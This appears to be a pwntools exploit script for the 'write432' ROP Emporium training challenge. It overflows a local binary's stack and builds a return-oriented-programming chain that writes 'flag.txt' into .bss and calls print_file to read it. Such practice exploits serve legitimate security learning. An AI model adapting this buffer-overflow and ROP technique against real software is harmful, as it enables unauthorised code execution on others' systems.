from pwn import *

elf = ELF("./write432")

p = elf.process()
raw_input("DEBUG")

pop_edi_ebp = 0x080485aa
mov_edi_ebp = 0x08048543

bss = 0x804a030

payload = b"A"*44
payload += p32(pop_edi_ebp)
payload += p32(bss)
payload += b"flag"
payload += p32(mov_edi_ebp)
payload += p32(pop_edi_ebp)
payload += p32(bss+4)
payload += b".txt"
payload += p32(mov_edi_ebp)
payload += p32(elf.sym['print_file'])
payload += b"A"*4
payload += p32(bss)


p.sendline(payload)

p.interactive()

